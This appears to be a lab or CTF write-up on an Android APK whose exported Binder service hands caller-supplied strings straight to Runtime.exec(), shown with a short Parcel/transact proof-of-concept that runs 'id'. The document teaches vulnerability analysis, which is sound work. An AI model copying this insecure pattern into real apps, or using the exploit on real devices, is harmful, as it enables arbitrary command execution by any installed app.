# Exercise 4 Write-up : Arbitrary Command Execution via Binder 

This exercise focuses on analyzing an Android APK that uses **Binder**, Android’s Inter-Process Communication (IPC) mechanism. Our goal is to identify a vulnerability that could allow **arbitrary command execution** via a misconfigured **Binder service**.

Our goal is to **Discover a code path in HonSystemService.apk that allows an unprivileged application to execute arbitrary system commands via Binder IPC.**

## Android Binder IPC
- Binder allows apps and services to communicate securely.
- System services often expose Binder interfaces via `Service` components.
- If a service is `exported` and lacks permission checks, any app can interact with it.
- A vulnerability exists when a Binder service accepts input from any app and executes system commands (e.g., `Runtime.getRuntime().exec()`).

### 1. Open APK in JADX
We use JADX to decompile and analyze the source code.

### 2. Inspect AndroidManifest.xml
We locate AndroidManifest.xml in JADX and identify the key component:

```xml
<service
    android:name=".HonSystemService"
    android:exported="true" />
```

**Issue** : The service is exported without a permission. Any app can bind to it.

### 3. Find Service Implementation

```java
@Override
public IBinder onBind(Intent intent) {
    return new HonSystemBinder();
}
```

This confirms the use of a custom Binder class.

### 4. Analyze Binder Class: HonSystemBinder :

In HonSystemBinder, we find the key method:

```java
@Override
public boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
    switch (code) {
        case 1:
            String command = data.readString();
            Runtime.getRuntime().exec(command);
            reply.writeString("Executed: " + command);
            return true;
        default:
            return super.onTransact(code, data, reply, flags);
    }
}
```

Critical Vulnerability Identified:

- No permission or identity checks.
- Untrusted input directly passed to Runtime.exec().
-Any app can bind to the service and execute system commands.

A malicious app can use AIDL or Parcel to send an arbitrary shell command:

```java
Parcel data = Parcel.obtain();
Parcel reply = Parcel.obtain();
IBinder binder = serviceConnection.getBinder();
data.writeInterfaceToken("com.hon.binderinterface");
data.writeString("id");  // or "whoami", "ls", etc.
binder.transact(1, data, reply, 0);

String result = reply.readString();
```

This could lead to remote code execution depending on the privileges of the system service.

